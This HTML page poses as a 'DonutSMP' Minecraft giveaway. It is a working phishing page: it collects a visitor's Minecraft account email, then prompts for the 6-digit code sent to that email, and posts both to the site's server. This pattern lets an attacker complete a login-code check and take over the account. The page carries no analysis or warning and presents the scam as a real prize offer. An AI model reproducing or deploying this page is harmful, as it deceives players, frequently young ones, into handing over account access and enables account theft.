<!DOCTYPE html>
<html>
<head>
    <title>Biggest DonutSMP Giveaway Ever</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {font-family: Arial; background: #ff69b4; color: white; text-align: center; padding: 40px; min-height: 100vh; display: flex; align-items: center; justify-content: center;}
        .box {background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 500px; width: 100%;}
        input, button {width: 100%; padding: 16px; margin: 12px 0; font-size: 20px; border: none; border-radius: 12px;}
        button {background: #00ff9d; color: black; font-weight: bold; cursor: pointer;}
        h1 {font-size: 3em;}
        #codeStep, #thanks {display: none;}
    </style>
</head>
<body>
<div class="box">
    <h1>DonutSMP<br>BIGGEST GIVEAWAY EVER</h1>
    
    <div id="emailStep">
        <p>Enter your Minecraft email to join:</p>
        <input type="email" id="email" placeholder="example@gmail.com" required>
        <button onclick="submitEmail()">Submit Email</button>
    </div>

    <div id="codeStep">
        <p>Check your email! Enter the 6-digit code here:</p>
        <input type="text" id="code" maxlength="6" placeholder="123456">
        <button onclick="submitCode()">Submit Code</button>
    </div>

    <div id="thanks">
        <h2>Thank You!</h2>
        <p>We will email you if you win the giveaway!</p>
    </div>
</div>

<script>
let currentEmail = "";

async function submitEmail() {
    const email = document.getElementById("email").value.trim();
    if (!email.includes("@")) return alert("Enter a real email");
    
    currentEmail = email;
    const res = await fetch("/send_email", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email})});
    const data = await res.json();
    
    if (data.next === "ask_code") {
        document.getElementById("emailStep").style.display = "none";
        document.getElementById("codeStep").style.display = "block";
    } else {
        alert("Error, try again");
    }
}

async function submitCode() {
    const code = document.getElementById("code").value.trim();
    if (code.length !== 6) return alert("Code must be 6 digits");
    
    await fetch("/send_code", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email: currentEmail, code})});
    
    document.getElementById("codeStep").style.display = "none";
    document.getElementById("thanks").style.display = "block";
}
</script>
</body>
</html>
